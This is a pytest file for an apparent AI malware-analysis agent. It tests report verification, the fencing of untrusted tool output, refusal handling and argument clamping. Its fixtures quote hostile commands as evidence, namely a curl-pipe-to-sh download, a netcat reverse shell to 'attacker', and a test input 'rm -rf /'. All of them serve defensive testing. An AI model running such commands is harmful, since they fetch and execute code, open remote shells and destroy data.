"""The agent loop with a scripted model (OpenAI-style responses, no network) and real tools."""

import json
from types import SimpleNamespace as NS

import pytest

from aegis_worker_b import agent, sandbox_tools
from aegis_worker_b.samples import by_name


def call(name, args=None, id_="c1"):
    return NS(id=id_, type="function", function=NS(name=name, arguments=json.dumps(args or {})))


def reply(*calls, finish="tool_calls", content=None, refusal=None):
    msg = NS(content=content, tool_calls=list(calls) or None, refusal=refusal)
    return NS(choices=[NS(message=msg, finish_reason=finish)], model="openai/gpt-5",
              usage=NS(prompt_tokens=10, completion_tokens=5, prompt_tokens_details=NS(cached_tokens=4)))


class ScriptedChat:
    def __init__(self, replies):
        self.replies = list(replies)
        self.calls = []

    def create(self, **kw):
        self.calls.append({**kw, "messages": list(kw["messages"])})
        return self.replies.pop(0)


@pytest.fixture
def sample_file(tmp_path):
    def make(name):
        s = by_name()[name]
        p = tmp_path / s.filename
        p.write_bytes(s.data)
        return s, str(p)

    return make


def tools_for(path, known=None):
    def run(tool, args):
        if tool == "known_hashes":
            return known or {"matched": False, "matches": []}
        return sandbox_tools.TOOLS[tool](path, *args)

    return run


def run(chat, s, path, model="openai/gpt-5", known=None):
    return agent.analyze(filename=s.filename, sha256="x" * 64, size=len(s.data), head=s.data[:4096],
                         run_tool=tools_for(path, known), chat=chat, model=model)


REPORT = {
    "verdict": "malicious", "confidence": "high", "summary": "Downloads and runs a script.",
    "file_type": "POSIX shell script", "playbook_rows": [".sh, .bash, .ps1"],
    "vulnerabilities": [
        {"type": "command injection", "severity": "high", "tool": "code_patterns", "location": "line 2",
         "evidence": "curl -s https://example.invalid/agent.sh | sh", "explanation": "pipes a download to sh"},
        {"type": "made up", "severity": "high", "tool": "code_patterns", "location": "line 9",
         "evidence": "nc -e /bin/sh attacker 4444", "explanation": "not in the file"},
        {"type": "never ran", "severity": "high", "tool": "bandit", "location": "line 1",
         "evidence": "curl -s https://example.invalid/agent.sh", "explanation": "bandit never ran"},
    ],
    "unknowns": [],
}


def test_tools_then_a_verified_report(sample_file):
    s, path = sample_file("sh-dropper")
    chat = ScriptedChat([
        reply(call("identify", {}, "a"), call("known_hashes", {}, "k"), call("code_patterns", {"language": "shell"}, "b")),
        reply(call("submit_report", REPORT, "r")),
    ])
    res = run(chat, s, path)
    assert res.verdict == "malicious" and res.stop == "submitted" and res.turns == 2
    assert [v["verified"] for v in res.vulnerabilities] == [True, False, False]
    assert [t["tool"] for t in res.tool_log] == ["identify", "known_hashes", "code_patterns"]
    assert res.usage == {"prompt_tokens": 20, "completion_tokens": 10, "cached_tokens": 8}
    first = chat.calls[0]
    assert first["messages"][0]["role"] == "system" and "file_types_vulnerabilities.md" in first["messages"][0]["content"]
    assert "shellcheck" in first["messages"][1]["content"]
    assert first["tool_choice"] == "required" and first["reasoning_effort"] == "medium"
    # Each tool answer goes back as a role=tool message tied to its call.
    second = chat.calls[1]["messages"]
    assert [m["role"] for m in second[-4:]] == ["assistant", "tool", "tool", "tool"]
    assert second[-3]["tool_call_id"] == "a"


def test_tool_output_is_fenced_as_untrusted(sample_file):
    s, path = sample_file("sh-dropper")
    chat = ScriptedChat([reply(call("read_lines", {"start": 1, "count": 5})), reply(finish="stop"), reply(finish="stop")])
    run(chat, s, path)
    result = chat.calls[1]["messages"][-1]["content"]
    assert result.startswith(agent.FENCE_OPEN) and result.endswith(agent.FENCE_CLOSE) and "curl" in result


def test_no_report_ends_unknown_after_one_nudge(sample_file):
    s, path = sample_file("py-clean")
    chat = ScriptedChat([reply(finish="stop", content="It looks fine."), reply(finish="stop")])
    res = run(chat, s, path)
    assert res.verdict == "unknown" and len(chat.calls) == 2
    assert "submit_report" in chat.calls[1]["messages"][-1]["content"]


@pytest.mark.parametrize("r", [reply(finish="content_filter"), reply(finish="stop", refusal="I can't help with that.")])
def test_refusal_ends_unknown(sample_file, r):
    s, path = sample_file("py-clean")
    res = run(ScriptedChat([r]), s, path)
    assert res.verdict == "unknown" and "declined" in res.summary


def test_unknown_tool_names_are_refused(sample_file):
    s, path = sample_file("py-clean")
    chat = ScriptedChat([reply(call("shell", {"cmd": "rm -rf /"})), reply(call("submit_report", {**REPORT, "vulnerabilities": []}))])
    res = run(chat, s, path)
    assert res.tool_log[0]["ok"] is False and "no tool" in res.tool_log[0]["detail"]


def test_non_reasoning_models_get_no_reasoning_effort(sample_file):
    s, path = sample_file("py-clean")
    chat = ScriptedChat([reply(call("submit_report", {**REPORT, "vulnerabilities": []}))])
    run(chat, s, path, model="openai/gpt-4.1")
    assert "reasoning_effort" not in chat.calls[0]


def test_arguments_are_clamped_to_the_schema():
    assert agent._args("code_patterns", {"language": "rm -rf"}) == ["shell"]
    assert agent._args("read_lines", {"start": 3, "count": 9}) == ["3", "9"]
    assert agent._args("identify", {"anything": "x"}) == []


def test_tool_definitions_are_strict_openai_functions():
    defs = {d["function"]["name"]: d for d in agent.tool_definitions()}
    assert set(defs) == set(sandbox_tools.TOOLS) | {"known_hashes", "submit_report"}
    for d in defs.values():
        f = d["function"]
        assert d["type"] == "function" and f["strict"] is True
        assert f["parameters"]["additionalProperties"] is False
        assert sorted(f["parameters"]["required"]) == sorted(f["parameters"]["properties"])


def test_gateway_model_prefers_gpt61_sol_and_explains_an_empty_list(monkeypatch):
    monkeypatch.delenv("AEGIS_CHALK_MODEL", raising=False)
    listing = lambda ids: NS(models=NS(list=lambda: [NS(id=i) for i in ids]))  # noqa: E731
    assert agent.gateway_model(listing(["openai/gpt-4.1", "openai/gpt-5-mini", "openai/gpt-5"])) == "openai/gpt-5"
    assert agent.gateway_model(listing(["openai/gpt-5", "openai/gpt-6.1-sol"])) == "openai/gpt-6.1-sol"
    with pytest.raises(RuntimeError, match="API key"):
        agent.gateway_model(listing([]))


@pytest.mark.parametrize("name,verdict", [("zip-slip", "malicious"), ("py-cmd-injection", "suspicious"), ("py-clean", "clean")])
def test_baseline_rules(sample_file, name, verdict):
    s, path = sample_file(name)
    res = agent.baseline(filename=s.filename, head=s.data[:4096], run_tool=tools_for(path))
    assert res.verdict == verdict and res.analyst == "rules"


def test_gateway_client_uses_the_router_key_when_set(monkeypatch):
    monkeypatch.setenv("CHALK_ROUTER_API_KEY", "ck-test")
    monkeypatch.setenv("CHALK_ROUTER_ENV_ID", "env-test")
    c = agent.gateway_client()
    assert c.api_key == "ck-test" and str(c.base_url).rstrip("/").endswith("/v1/router")
    assert c.default_headers["X-Chalk-Env-Id"] == "env-test"
